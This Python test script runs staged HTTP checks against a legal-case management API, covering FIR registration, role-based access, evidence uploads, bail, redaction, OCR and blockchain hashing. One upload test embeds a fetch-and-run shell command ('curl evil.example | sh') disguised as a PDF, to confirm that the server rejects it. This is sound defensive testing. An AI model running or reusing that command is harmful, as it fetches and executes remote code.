#!/usr/bin/env python3
"""
Real HTTP flow checks, one stage at a time — driven by scripts/staged_test.sh.

Standard library only (no pip install needed on the host). Every check goes
through the running API exactly as the frontend would; nothing reads or writes
the database directly, so a passing check means the flow actually works, not
that the data happens to look right.

State (case id, document ids, tokens) is kept in a JSON file between stages,
so a later stage continues the story an earlier one started: the FIR the Duty
Officer registers in `core` is the document whose redaction `redaction`
checks, and whose hash `chain` writes.

Result levels:
  PASS  the flow works
  FAIL  a real defect in a flow the demo depends on
  WARN  works as coded, but will surprise someone during a live demo
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
import uuid

PASSWORD = "GovSecure@2026"
PERSONAS = {
    "admin": "admin.sharma@legadoc.gov.in",
    "io": "officer.rao@police.gov.in",
    "duty": "duty.verma@police.gov.in",
    "sho": "sho.singh@police.gov.in",
    "court": "magistrate.iyer@court.gov.in",
    "prosecutor": "prosecutor.sen@court.gov.in",
    "fsl": "fsl.director@fsl.gov.in",
    "defense": "defense.advocate@bar.in",
    "ncrb": "analyst.ncrb@nic.in",
}

FIR_TEXT = (
    "Complainant: Shri Ramesh Kumar s/o Suresh Kumar, resident of Karol Bagh, Delhi. "
    "Phone: 9812345678. On 12 September 2026 at about 21:30 his motorcycle was stolen "
    "from outside his residence. Witness: Priya Menon, Phone: 9876543210, saw two persons "
    "leaving on it towards Pusa Road."
)
REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def short(x, n=220):
    s = x if isinstance(x, str) else json.dumps(x, default=str)
    return s if len(s) <= n else s[:n] + "…"


class Flow:
    def __init__(self, api, state_path, stage, web=None):
        self.api = api.rstrip("/")
        self.web = (web or "").rstrip("/")
        self.state_path = state_path
        self.stage = stage
        try:
            with open(state_path) as fh:
                self.state = json.load(fh)
        except (OSError, ValueError):
            self.state = {}
        self.state.setdefault("tokens", {})
        self.state.setdefault("ids", {})
        self.state.setdefault("login_times", [])
        self.results = []

    @property
    def ids(self):
        return self.state["ids"]

    def save(self):
        with open(self.state_path, "w") as fh:
            json.dump(self.state, fh, indent=2)

    # ------------------------------------------------------------- http ----
    def http(self, method, path, who=None, body=None, form=None, files=None, base=None, raw=False):
        url = (base or self.api) + path
        headers, data = {}, None
        if form is not None or files is not None:
            boundary = uuid.uuid4().hex
            parts = []
            for k, v in (form or {}).items():
                parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode())
            for k, (fname, content, ctype) in (files or {}).items():
                parts.append(
                    f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"; filename="{fname}"\r\n'
                    f"Content-Type: {ctype}\r\n\r\n".encode() + content + b"\r\n"
                )
            parts.append(f"--{boundary}--\r\n".encode())
            data = b"".join(parts)
            headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        elif body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        if who:
            headers["Authorization"] = "Bearer " + self.token(who)
        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=120) as r:
                status, payload = r.status, r.read()
        except urllib.error.HTTPError as e:
            status, payload = e.code, e.read()
        except (urllib.error.URLError, TimeoutError, ConnectionError) as e:
            return 0, str(e)
        text = payload.decode("utf-8", "replace")
        if raw:
            return status, text
        try:
            return status, json.loads(text) if text else None
        except ValueError:
            return status, text

    # ------------------------------------------------------------- auth ----
    def _pace_login(self):
        # POST /auth/login allows 10 attempts/min per source IP on main, and
        # counts successful logins too — pace below that or later logins 429.
        now = time.time()
        times = [t for t in self.state["login_times"] if now - t < 61]
        if len(times) >= 8:
            wait = 61 - (now - times[0])
            print(f"  … pacing logins for the rate limiter ({wait:.0f}s)")
            time.sleep(max(wait, 0))
            now = time.time()
            times = [t for t in times if now - t < 61]
        times.append(now)
        self.state["login_times"] = times

    def login(self, who, password=PASSWORD, base=None, path="/auth/login"):
        self._pace_login()
        s, b = self.http("POST", path, base=base, body={"email": PERSONAS[who], "password": password})
        if s == 200 and password == PASSWORD:
            self.state["tokens"][who] = {"access": b["access_token"], "refresh": b["refresh_token"], "at": time.time()}
        self.save()
        return s, b

    def token(self, who):
        t = self.state["tokens"].get(who)
        now = time.time()
        if t and now - t["at"] < 12 * 60:
            return t["access"]
        if t and t.get("refresh"):
            s, b = self.http("POST", "/auth/refresh", body={"refresh_token": t["refresh"]})
            if s == 200:
                t.update(access=b["access_token"], at=now)
                self.save()
                return t["access"]
        s, b = self.login(who)
        if s != 200:
            raise RuntimeError(f"cannot log in as {who}: HTTP {s} {short(b)}")
        return self.state["tokens"][who]["access"]

    # ----------------------------------------------------------- checks ----
    def check(self, name, ok, detail="", level="FAIL"):
        result = "PASS" if ok else level
        colour = {"PASS": "32", "WARN": "33", "FAIL": "31"}[result]
        print(f"  \033[{colour}m{result:4}\033[0m {name}" + ("" if ok or not detail else f"\n         {detail}"))
        self.results.append({"check": name, "result": result, "detail": "" if ok else detail})
        return ok

    def expect(self, name, got, want, body=None, level="FAIL"):
        wants = want if isinstance(want, (tuple, list, set)) else (want,)
        return self.check(name, got in wants, f"HTTP {got}, wanted {want}: {short(body)}", level)

    def wait_doc(self, doc_id, who="court", timeout=300):
        end, st = time.time() + timeout, None
        while time.time() < end:
            s, b = self.http("GET", f"/documents/{doc_id}", who=who)
            st = b.get("status") if s == 200 and isinstance(b, dict) else f"HTTP {s}"
            if st in ("ready", "needs_review"):
                return st
            time.sleep(5)
        return st

    def finish(self):
        self.save()
        path = os.path.join(os.path.dirname(self.state_path) or ".", "results.json")
        try:
            with open(path) as fh:
                allr = json.load(fh)
        except (OSError, ValueError):
            allr = {}
        allr[self.stage] = self.results
        with open(path, "w") as fh:
            json.dump(allr, fh, indent=2)
        counts = {k: sum(r["result"] == k for r in self.results) for k in ("PASS", "WARN", "FAIL")}
        print(f"\n  {self.stage}: {counts['PASS']} pass, {counts['WARN']} warn, {counts['FAIL']} fail")
        return 1 if counts["FAIL"] else 0


def upload(f, who, case_id, doc_type, fname, content, ctype):
    return f.http("POST", "/documents", who=who, form={"case_id": case_id, "doc_type": doc_type},
                  files={"file": (fname, content, ctype)})


# ================================================================= stages ===

def stage_core(f):
    s, b = f.http("GET", "/health")
    f.expect("API health", s, 200, b)

    print("  -- authentication")
    for who, email in PERSONAS.items():
        s, b = f.login(who)
        f.expect(f"login {who} ({email})", s, 200, b)
    s, b = f.login("duty", password="not-the-password")
    f.expect("wrong password rejected", s, 401, b)
    s, b = f.http("GET", "/cases")
    f.expect("request without a token rejected", s, 401, b)
    s, b = f.http("GET", "/auth/me", who="duty")
    f.check("/auth/me returns the server-side role", s == 200 and isinstance(b, dict) and b.get("role") == "duty_officer", short(b))
    s, b = f.http("POST", "/auth/refresh", body={"refresh_token": f.state["tokens"].get("duty", {}).get("refresh", "")})
    f.expect("refresh token exchanges for a new access token", s, 200, b)

    print("  -- Flow 1: FIR registration")
    s, b = f.http("POST", "/cases", who="io", body={"crime_type": "Theft", "complaint_text": FIR_TEXT})
    f.expect("IO cannot register an FIR (Duty Officer only)", s, 403, b)
    s, b = f.http("POST", "/cases", who="duty", body={"crime_type": "Theft", "complaint_text": FIR_TEXT})
    if not f.expect("Duty Officer registers FIR", s, 201, b):
        return
    case = f.ids["case"] = b["id"]
    s, b = f.http("GET", f"/cases/{case}/documents", who="duty")
    ok = s == 200 and isinstance(b, list) and b and b[0].get("doc_type") == "FIR"
    if f.check("complaint narrative stored as the case's first document", ok, short(b)):
        f.ids["fir_doc"] = b[0]["id"]
    s, b = f.http("GET", "/cases", who="duty")
    f.check("Duty Officer's case list shows its FIR", s == 200 and any(c["id"] == case for c in b), short(b))
    s, b = f.http("GET", "/cases", who="ncrb")
    f.check("NCRB analyst is not handed the case docket", s == 200 and b == [], short(b))
    s, b = f.http("GET", "/cases", who="defense")
    # Correct at this point: the advocate has no engagement on THIS case yet, so
    # it must not appear. Scoped to this run's case rather than asserting an
    # empty list, because engagements recorded by earlier runs persist in the
    # volumes. The engagement, and the case then appearing, are checked below.
    listed = {c["id"] for c in b} if s == 200 and isinstance(b, list) else set()
    f.check("defence without an engagement cannot see this case", s == 200 and case not in listed,
            f"HTTP {s}: {short(b)}")

    print("  -- IO assignment")
    s, users = f.http("GET", "/admin/users", who="admin")
    f.expect("admin lists users", s, 200, users)
    s, orgs = f.http("GET", "/admin/orgs", who="admin")
    f.expect("admin lists organisations", s, 200, orgs)
    if not (isinstance(users, list) and isinstance(orgs, list)):
        return
    uid = {u.get("email"): u.get("id") for u in users}
    fsl_org = next((o.get("id") for o in orgs if "Forensic" in (o.get("name") or "")), None)

    s, b = f.http("GET", f"/cases/{case}", who="io")
    f.expect("unassigned IO blocked from the case", s, 403, b)
    s, b = f.http("POST", f"/cases/{case}/assign-io", who="sho", body={"io_user_id": uid.get(PERSONAS["io"])})
    f.expect("SHO assigns IO", s, 201, b)
    s, b = f.http("GET", f"/cases/{case}", who="io")
    f.expect("assigned IO opens the case", s, 200, b)
    s, b = f.http("GET", "/cases/not-a-uuid", who="sho")
    f.check("malformed case id is a 404, not a 500", s == 404, f"HTTP {s}: {short(b)}")
    s, b = f.http("POST", f"/cases/{case}/assign-io", who="sho", body={"io_user_id": uid.get(PERSONAS["defense"])})
    f.check("assign-io refuses a user who is not an IO", 400 <= s < 500,
            f"HTTP {s}: a defense advocate was recorded as this case's IO")

    print("  -- Flow 2: evidence upload (API side)")
    stmt = (b"Statement of witness Priya Menon recorded under Sec 180 BNSS. Contact 9876543210. "
            b"She states that she saw two persons leaving on the motorcycle towards Pusa Road.")
    s, b = upload(f, "io", case, "Witness_Statement", "statement.txt", stmt, "text/plain")
    if f.expect("IO uploads text evidence (202, processing)", s, 202, b):
        f.ids["stmt_doc"] = b["id"]
    s, b = upload(f, "io", case, "Witness_Statement", "statement.txt", stmt, "text/plain")
    f.check("identical re-upload is deduplicated", s in (200, 202) and isinstance(b, dict) and b.get("id") == f.ids.get("stmt_doc"), f"HTTP {s}: {short(b)}")
    s, b = upload(f, "io", case, "Seizure_Memo", "memo.pdf", b"#!/bin/sh\ncurl evil.example | sh\n", "application/pdf")
    f.check("shell script disguised as a PDF is rejected", 400 <= s < 500, f"HTTP {s}: {short(b)}")
    s, b = upload(f, "defense", case, "Other", "x.txt", b"hello from defense", "text/plain")
    f.expect("Defense cannot upload evidence", s, 403, b)
    s, b = f.http("POST", f"/cases/{case}/case-diary", who="io",
                  body={"text": "Visited scene at Karol Bagh. Spoke to witness Priya Menon (9876543210)."})
    if f.expect("IO appends a case diary entry", s, 201, b):
        f.ids["diary"] = b["id"]

    print("  -- Flow 3: Section 91 requisition to FSL")
    f.check("FSL organisation exists", bool(fsl_org), short(orgs))
    s, b = f.http("POST", f"/cases/{case}/evidence-requests", who="io",
                  body={"requested_org_id": fsl_org, "doc_type_expected": "FSL Report", "notes": "Examine broken lock"})
    if f.expect("IO raises an evidence request to FSL", s, 201, b):
        req = f.ids["evidence_request"] = b["id"]
        s, inbox = f.http("GET", "/evidence-requests", who="fsl")
        f.check("FSL inbox shows the request", s == 200 and any(r.get("id") == req for r in inbox), f"HTTP {s}: {short(inbox)}")
        s, b = f.http("GET", "/cases", who="fsl")
        # Not "exactly one case": re-running against the same volumes leaves
        # earlier requisitions in place. What must hold is that FSL sees this
        # case, and nothing it has no requisition for.
        listed = {c["id"] for c in b} if s == 200 and isinstance(b, list) else set()
        requisitioned = {str(r.get("case_id")) for r in inbox} if isinstance(inbox, list) else set()
        f.check("FSL case list shows only requisitioned cases", case in listed and listed <= requisitioned,
                f"HTTP {s}: listed={sorted(listed)} requisitioned={sorted(requisitioned)}")
        s, b = f.http("POST", f"/cases/{case}/file-charge-sheet", who="prosecutor")
        missing = (b or {}).get("detail", {}).get("missing_items") if isinstance(b, dict) else None
        f.check("charge sheet blocked while the requisition is outstanding",
                s == 409 and bool(missing), f"HTTP {s}: {short(b)}")

        report = b"CFSL report: tool marks on the lock are consistent with a flat-head screwdriver."
        s, b = f.http("POST", f"/evidence-requests/{req}/submit", who="fsl", files={"file": ("fsl_report.txt", report, "text/plain")})
        f.check("FSL fulfils the request", s in (200, 201) and isinstance(b, dict) and b.get("status") == "completed", f"HTTP {s}: {short(b)}")
        s, b = f.http("POST", f"/evidence-requests/{req}/submit", who="fsl", files={"file": ("again.txt", b"again", "text/plain")})
        f.expect("second fulfilment is refused", s, 409, b)

    print("  -- Flow 4: bail track")
    s, b = f.http("POST", f"/cases/{case}/bail/application", who="defense")
    f.expect("defence with no recorded engagement is refused", s, 403, b)
    # Access for the defence comes from a CaseParty row, recorded by the bench —
    # deliberately not self-service, or any advocate could open any case.
    s, b = f.http("POST", f"/cases/{case}/parties", who="court",
                  body={"email": PERSONAS["defense"], "party_role": "defense"})
    f.expect("court records the defence engagement", s, (200, 201), b)
    s, b = f.http("GET", "/cases", who="defense")
    f.check("engaged defence now sees the case", s == 200 and any(c["id"] == case for c in b), f"HTTP {s}: {short(b)}")
    s, b = f.http("POST", f"/cases/{case}/bail/application", who="defense")
    f.expect("bail application refused before arrest", s, 400, b)
    s, b = f.http("POST", f"/cases/{case}/bail/arrest", who="io")
    f.expect("IO records arrest", s, 201, b)
    s, b = f.http("POST", f"/cases/{case}/bail/application", who="defense")
    f.expect("Defense files bail application", s, 201, b)
    s, b = f.http("POST", f"/cases/{case}/bail/hearing-notice", who="court")
    f.expect("court schedules bail hearing", s, (200, 201), b)
    s, b = f.http("POST", f"/cases/{case}/bail/order", who="court", body={"granted": True, "conditions": "Surrender passport"})
    f.expect("court issues bail order", s, (200, 201), b)
    s, b = f.http("POST", f"/cases/{case}/bail/surety", who="defense", body={"surety_name": "Anil Kumar", "bond_amount": 50000})
    f.expect("Defense registers surety", s, (200, 201), b)
    s, b = f.http("GET", f"/cases/{case}/bail", who="court")
    f.check("court sees the full bail record", s == 200 and isinstance(b, list) and len(b) >= 4, f"HTTP {s}: {short(b)}")

    print("  -- Flow 3/5: charge sheet, trial, judgment")
    s, b = f.http("GET", "/admin/stage-requirements", who="admin")
    f.check("stage requirements are configured (charge-sheet AND-join has something to check)",
            s == 200 and isinstance(b, list) and len(b) > 0,
            f"HTTP {s}: none seeded — filing is never blocked, so the 409 'missing items' demo path cannot be shown",
            level="WARN")
    s, b = f.http("POST", f"/cases/{case}/file-charge-sheet", who="prosecutor")
    f.expect("prosecutor files charge sheet", s, 200, b)
    s, b = f.http("POST", f"/cases/{case}/trial/hearing-notice", who="court")
    f.expect("court schedules trial hearing", s, (200, 201), b)
    s, b = f.http("POST", f"/cases/{case}/judgment", who="court", body={"verdict": "convicted", "summary": "Theft proven."})
    f.expect("court records judgment", s, (200, 201), b)

    print("  -- audit trail")
    s, b = f.http("GET", f"/cases/{case}/audit-log", who="court")
    f.check("audit log readable and chain intact", s == 200 and isinstance(b, dict) and b.get("chain_intact") is True, f"HTTP {s}: {short(b)}")
    s, b = f.http("GET", f"/cases/{case}/audit-log/chain-integrity", who="admin")
    f.check("chain-integrity endpoint agrees", s == 200 and isinstance(b, dict) and b.get("chain_intact") is True, f"HTTP {s}: {short(b)}")
    if f.ids.get("fir_doc"):
        s, b = f.http("GET", f"/documents/{f.ids['fir_doc']}", who="court")
        f.check("no document text is served before redaction completes",
                s == 200 and b.get("status") == "processing" and b.get("text") is None, f"HTTP {s}: {short(b)}")


def stage_redaction(f):
    fir, case = f.ids.get("fir_doc"), f.ids.get("case")
    if not f.check("core stage state present", bool(fir and case), "run the core stage first"):
        return
    print("  … waiting for ai_parser_worker (first task loads spaCy + Presidio)")
    st = f.wait_doc(fir, timeout=300)
    f.check("FIR redaction finished", st in ("ready", "needs_review"), f"still {st} after 5 min — is ai_parser_worker consuming its queue?")
    f.check("FIR marked ready without manual review", st == "ready",
            "routed to needs_review: GET /documents/:id returns no text to ANY role until reviewed, so the redaction contrast cannot be shown",
            level="WARN")
    s, court = f.http("GET", f"/documents/{fir}", who="court")
    s2, duty = f.http("GET", f"/documents/{fir}", who="duty")
    ct = (court or {}).get("text") or "" if isinstance(court, dict) else ""
    dt = (duty or {}).get("text") or "" if isinstance(duty, dict) else ""
    f.check("court sees the unredacted phone number", "9812345678" in ct, short(ct))
    f.check("Duty Officer sees the phone number masked", bool(dt) and "9812345678" not in dt and "[REDACTED" in dt, short(dt))
    f.check("Duty Officer sees the witness name masked", bool(dt) and "Priya Menon" not in dt, short(dt), level="WARN")
    f.check("Duty Officer sees the complainant name masked", bool(dt) and "Ramesh Kumar" not in dt, short(dt), level="WARN")
    if dt:
        print(f"         court: {short(ct, 160)}\n         duty : {short(dt, 160)}")

    if f.ids.get("stmt_doc"):
        st = f.wait_doc(f.ids["stmt_doc"], timeout=120)
        f.check("uploaded text evidence finished (passes through OCR worker queue)", st in ("ready", "needs_review"),
                f"still {st} — text/plain uploads are routed to ocr_worker, which is not running in this stage; the ocr stage will pick it up",
                level="WARN")

    if f.ids.get("diary"):
        end, entry = time.time() + 120, None
        while time.time() < end:
            s, b = f.http("GET", f"/cases/{case}/case-diary", who="io")
            entry = next((e for e in (b if isinstance(b, list) else []) if e.get("id") == f.ids["diary"]), None)
            if entry and entry.get("status") == "ready":
                break
            time.sleep(5)
        f.check("case diary entry tagged and released", bool(entry) and entry.get("status") == "ready", short(entry))
        # The court is entitled to full text. The Duty Officer registered this
        # FIR, so it can open the case, but it sits outside FULL_TEXT_ACCESS_ROLES
        # and must only ever see redacted text.
        s, b = f.http("GET", f"/cases/{case}/case-diary", who="duty")
        diary_text = " ".join(e.get("text", "") for e in b) if isinstance(b, list) else ""
        f.check("diary text shown to the Duty Officer is redacted",
                bool(diary_text) and "9876543210" not in diary_text and "Priya Menon" not in diary_text,
                f"HTTP {s}: {short(b)} — the AI parser tags diary entries but stores no spans, and "
                "GET /cases/:id/case-diary returns entry.text verbatim",
                level="WARN")

    s, b = f.http("GET", "/documents?status=needs_review", who="admin")
    f.expect("needs-review queue readable", s, 200, b)
    if ct and "Karol Bagh" in ct:
        start = ct.index("Karol Bagh")
        s, b = f.http("POST", f"/documents/{fir}/redact-tag", who="io",
                      body={"entity_type": "LOCATION", "span_start": start, "span_end": start + len("Karol Bagh")})
        f.expect("IO adds a manual redaction correction", s, 200, b)
        s, b = f.http("GET", f"/documents/{fir}", who="duty")
        f.check("correction applied to the Duty Officer's view", isinstance(b, dict) and "Karol Bagh" not in (b.get("text") or "Karol Bagh"), short(b))
    s, b = f.http("GET", f"/cases/{case}/audit-log/chain-integrity", who="admin")
    f.check("audit chain intact after worker writes", s == 200 and b.get("chain_intact") is True, f"HTTP {s}: {short(b)}")


def stage_ocr_upload(f):
    case = f.ids.get("case")
    if not f.check("core stage state present", bool(case), "run the core stage first"):
        return
    # staged_test.sh converts the WebP fixture to PNG first; OCR_SAMPLE overrides.
    path = os.environ.get("OCR_SAMPLE") or os.path.join(REPO, ".staged-test", "haryana_fir.png")
    with open(path, "rb") as fh:
        data = fh.read()
    if data[:8] == b"\x89PNG\r\n\x1a\n":
        ctype = "image/png"
    elif data[:3] == b"\xff\xd8\xff":
        ctype = "image/jpeg"
    elif data[:5] == b"%PDF-":
        ctype = "application/pdf"
    elif data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        ctype = "image/webp"
    else:
        ctype = "application/octet-stream"
    s, b = upload(f, "io", case, "FIR_Scan", os.path.basename(path), data, ctype)
    if f.expect("IO uploads a scanned FIR image (queued for OCR)", s, 202, b):
        f.ids["scan_doc"] = b["id"]


def stage_ocr_drain(f):
    scan, case = f.ids.get("scan_doc"), f.ids.get("case")
    if not f.check("ocr stage state present", bool(scan), "run the ocr stage first"):
        return
    st = f.wait_doc(scan, timeout=300)
    f.check("scanned FIR finished OCR + redaction", st in ("ready", "needs_review"), f"still {st}")
    s, b = f.http("GET", f"/cases/{case}/audit-log", who="court")
    entries = b.get("entries") if isinstance(b, dict) else None
    if entries is not None:
        ocr = [e for e in entries if e.get("action") == "document_ocr_extracted" and str(e.get("target_id")) == scan]
        meta = (ocr[-1].get("metadata") or ocr[-1].get("action_metadata") or {}) if ocr else {}
        f.check("OCR extracted text from the scan", bool(ocr) and (meta.get("token_count") or 0) > 20, short(meta or b))
        if meta:
            print(f"         engine={meta.get('ocr_engine')} tokens={meta.get('token_count')} rows={meta.get('row_count')} template={meta.get('template')}")
    else:
        counts = (b or {}).get("action_counts", {}) if isinstance(b, dict) else {}
        f.check("OCR extracted text from the scan", counts.get("document_ocr_extracted", 0) > 0, short(b))
    s, b = f.http("GET", f"/documents/{scan}", who="court")
    text = b.get("text") if isinstance(b, dict) else None
    f.check("court can read the OCR'd text", bool(text), f"status={st}, text={short(text)}", level="WARN")
    if text:
        print(f"         {short(text, 300)}")
    if f.ids.get("stmt_doc"):
        st = f.wait_doc(f.ids["stmt_doc"], timeout=60)
        f.check("typed text evidence (text/plain upload) becomes readable", st == "ready",
                f"status={st}: POST /documents sends text/plain to ocr_worker, which decodes the bytes as an "
                "image; both engines fail and the document lands in needs_review with no text for any role")


def stage_chain(f):
    docs = [f.ids.get(k) for k in ("fir_doc", "stmt_doc", "scan_doc") if f.ids.get(k)]
    if not f.check("earlier stage state present", bool(docs), "run core first"):
        return
    end, statuses = time.time() + 150, {}
    while time.time() < end:
        for d in docs:
            s, b = f.http("GET", f"/documents/{d}/chain-status", who="court")
            statuses[d] = b.get("chain_status") if s == 200 else f"HTTP {s}"
        if all(v != "pending" for v in statuses.values()):
            break
        time.sleep(5)
    f.check("chain_worker processed every queued hash write", all(v != "pending" for v in statuses.values()), short(statuses))
    confirmed = all(v == "confirmed" for v in statuses.values())
    f.check("hashes confirmed on Hyperledger Fabric", confirmed,
            f"{short(statuses)} — expected when the Fabric test-network is not running on this machine",
            level="WARN")
    if not confirmed and docs:
        s, b = f.http("POST", f"/documents/{docs[0]}/retry-chain-write", who="admin")
        f.check("admin can re-queue a failed chain write", s == 200 and b.get("retry_enqueued") is True, f"HTTP {s}: {short(b)}")


def stage_web(f):
    if not f.check("web base URL given", bool(f.web), "pass --web"):
        return
    s, html = f.http("GET", "/", base=f.web, raw=True)
    f.check("SPA shell served", s == 200 and 'id="root"' in html, f"HTTP {s}: {short(html)}")
    s, b = f.http("GET", "/api/health", base=f.web)
    f.check("/api proxied to FastAPI", s == 200 and isinstance(b, dict) and b.get("status") == "ok", f"HTTP {s}: {short(b)}")
    case = f.ids.get("case", str(uuid.uuid4()))
    s, html = f.http("GET", f"/cases/{case}", base=f.web, raw=True)
    f.check("deep link to a client route returns the SPA, not the API", s == 200 and 'id="root"' in html, f"HTTP {s}: {short(html)}")
    s, b = f.login("duty", base=f.web, path="/api/auth/login")
    f.expect("login through the web proxy", s, 200, b)


STAGES = {
    "core": stage_core,
    "redaction": stage_redaction,
    "ocr-upload": stage_ocr_upload,
    "ocr-drain": stage_ocr_drain,
    "chain": stage_chain,
    "web": stage_web,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("stage", choices=STAGES)
    ap.add_argument("--api", default="http://localhost:8000")
    ap.add_argument("--web", default="")
    ap.add_argument("--state", default=".staged-test/state.json")
    a = ap.parse_args()
    os.makedirs(os.path.dirname(a.state) or ".", exist_ok=True)
    f = Flow(a.api, a.state, a.stage, a.web)
    try:
        STAGES[a.stage](f)
    except Exception as e:  # a crash is a finding, not a reason to lose the results so far
        f.check(f"stage raised {type(e).__name__}", False, str(e))
    sys.exit(f.finish())


if __name__ == "__main__":
    main()
